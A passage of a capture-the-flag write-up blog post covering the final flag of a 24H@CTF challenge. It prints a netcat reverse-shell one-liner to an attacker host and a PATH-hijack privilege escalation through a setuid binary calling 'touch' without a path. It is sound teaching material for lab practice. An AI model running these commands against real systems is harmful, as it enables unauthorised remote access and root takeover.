id="flag-5">Flag #5</h1><p>The 4th flag is asking us to become root. Let’s do that.</p><p>With a working webshell, I should be able to get a proper reverse shell by running the following command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc vps_hostname 4444 &gt;/tmp/f
</pre></table></code></div></div><p>I now have a reverse shell as www-data user. Next, I started to look for privilege escalation vector. I looked for the classic vectors :</p><ul><li>cron jobs<li>writable folder<li>suid binaries</ul><p>Then I found a suid binary right at server root :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /
total 112
drwxr-xr-x   1 root root  4096 Feb 16 13:44 <span class="nb">.</span>
drwxr-xr-x   1 root root  4096 Feb 16 13:44 ..
<span class="nt">-rwxr-xr-x</span>   1 root root     0 Feb 16 13:44 .dockerenv
drwxr-xr-x   1 root root  4096 Feb 16 13:14 bin
drwxr-xr-x   2 root root  4096 Feb  1  2020 boot
drwxr-xr-x   5 root root   340 Feb 16 13:44 dev
drwxr-xr-x   1 root root  4096 Feb 16 13:44 etc
drwxr-xr-x   1 root root  4096 Feb  9 04:23 home
drwxr-xr-x   1 root root  4096 Feb 26  2020 lib
drwxr-xr-x   2 root root  4096 Feb 24  2020 lib64
drwxr-xr-x   2 root root  4096 Feb 24  2020 media
drwxr-xr-x   2 root root  4096 Feb 24  2020 mnt
<span class="nt">-rw-r--r--</span>   1 root root   127 Feb  9 03:50 my_very_special_script.c
<span class="nt">-rwsr-sr-x</span>   1 root root 16680 Feb 16 13:14 my_very_special_script.o
drwxr-xr-x   2 root root  4096 Feb 24  2020 opt
dr-xr-xr-x 439 root root     0 Feb 16 13:44 proc
drwx------   1 root root  4096 Feb 26  2020 root
drwxr-xr-x   1 root root  4096 Feb 26  2020 run
drwxr-xr-x   1 root root  4096 Feb 26  2020 sbin
drwxr-xr-x   2 root root  4096 Feb 24  2020 srv
dr-xr-xr-x  13 root root     0 Feb 15 13:29 sys
drwxrwxrwt   1 root root  4096 Feb 16 13:44 tmp
drwxr-xr-x   1 root root  4096 Feb 24  2020 usr
drwxr-xr-x   1 root root  4096 Feb 26  2020 var
</pre></table></code></div></div><p>We have an executable file and the source code :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /my_very_special_script.c

<span class="c">#include &lt;unistd.h&gt;</span>
<span class="c">#include &lt;stdlib.h&gt;</span>

int main<span class="o">()</span> <span class="o">{</span>
    setuid<span class="o">(</span>1000<span class="o">)</span><span class="p">;</span>
    system<span class="o">(</span><span class="s2">"touch /tmp/hello_world"</span><span class="o">)</span><span class="p">;</span>
    <span class="k">return </span>0<span class="p">;</span> 
<span class="o">}</span>
</pre></table></code></div></div><p>I immediately spooted the “pathless” call to touch. The fact that “touch” is called without a full path means that I should be able to add a folder to my PATH and hijack the real “touch” with a custom script :</p><p>First, I tested the theory :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir</span> /tmp/h3xit
<span class="nv">$ </span><span class="nb">cd</span> /tmp/h3xit
<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp/h3xit:<span class="nv">$PATH</span>
<span class="nv">$ </span>which <span class="nb">touch</span>
/usr/bin/touch
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'echo "path manipulation ftw"'</span> <span class="o">&gt;</span> <span class="nb">touch</span>           
<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">touch</span>
<span class="nv">$ </span>which <span class="nb">touch</span>
/tmp/touch
<span class="nv">$ </span><span class="nb">touch
</span>path manipulation ftw
</pre></table></code></div></div><p>It worked, so let’s setup the real thing :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n/bin/bash'</span> <span class="o">&gt;</span> <span class="nb">touch</span>
<span class="nv">$ </span><span class="nb">cat touch</span>
<span class="c">#!/bin/bash</span>
/bin/bash
<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">touch</span>
<span class="nv">$ </span>/my_very_special_script.o
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /home/admin
total 4
<span class="nt">-rw-r--r--</span> 1 root root 35 Feb  9 04:23 flag.txt
<span class="nv">$ </span><span class="nb">cat</span> /home/admin/flag.txt
FLAG<span class="o">{</span>5_la_track_est_enfin_finie_gj<span class="o">}</span>
</pre></table></code></div></div><p>Thanks for reading &lt;3</p><p>h3x</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/polyctf/'>polyctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/privilege-escalation/" class="post-tag no-text-decoration" >privilege escalation</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >rce</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=24H@CTF - Jamais Sans Mon Riz - h3xit's ~&url=https://h3xitsec.github.io/posts/polyctf-jamaissansmonriz/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=24H@CTF - Jamais Sans Mon Riz - h3xit's ~&u=https://h3xitsec.github.io/posts/polyctf-jamaissansmonriz/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=24H@CTF - Jamais Sans Mon Riz - h3xit's ~&url=https://h3xitsec.github.io/posts/polyctf-jamaissansmonriz/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/picoctf-binary/">PicoCTF 2022 - Binary Exploitation</a><li><a href="/posts/picoctf-reverse/">PicoCTF 2022 - Reverse Engineering Challenges</a><li><a href="/posts/picoctf-crypto/">PicoCTF 2022 - Crypto Challenges</a><li><a href="/posts/htb-routerspace/">Hack The Box - RouterSpace</a><li><a href="/posts/polyctf-crypto/">24H@CTF - Crypto</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-routerspace/"><div class="card-body"> <em class="timeago small" date="2022-03-08 00:00:00 -0500" >Mar 8</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - RouterSpace</h3><div class="text-muted small"><p> Challenge description https://app.hackthebox.com/machines/RouterSpace This VM is a medium Linux machine Reconnaissance / Enumeration Port scanning and service identification 1 2 3 4 5 6 7 8 9 ...</p></div></div></a></div><div class="card"> <a href="/posts/hack-hamlet/"><div class="card-body"> <em class="timeago small" date="2022-01-22 00:00:00 -0500" >Jan 22</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Hamlet</h3><div class="text-muted small"><p> Challenge description This one is a medium linux box. Warning: be gentle on brute forcing, enumerating. It doesn’t support much load. https://tryhackme.com/room/hamlet Reconnaissance / Enumer...</p></div></div></a></div><div class="card"> <a href="/posts/thm-lumberjack-turtle/"><div class="card-body"> <em class="timeago small" date="2022-01-25 00:00:00 -0500" >Jan 25</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Try Hack Me - Lumberjack Turtle</h3><div class="text-muted small"><p> Challenge description https://tryhackme.com/room/lumberjackturtle Reconnaissance / Enumeration Port scanning and service identification $ rustscan -a $ip -r 1-65535 -- -A -sC .----. .-. .-. ....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/polyctf-blue/" class="btn btn-outline-primary" prompt="Older"><p>24H@CTF - I'm Blue da ba dee da ba di</p></a> <a href="/posts/htb-routerspace/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - RouterSpace</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/h3xitsec">h3xit</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-79SMBN4E7F"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-79SMBN4E7F'); }); </script>
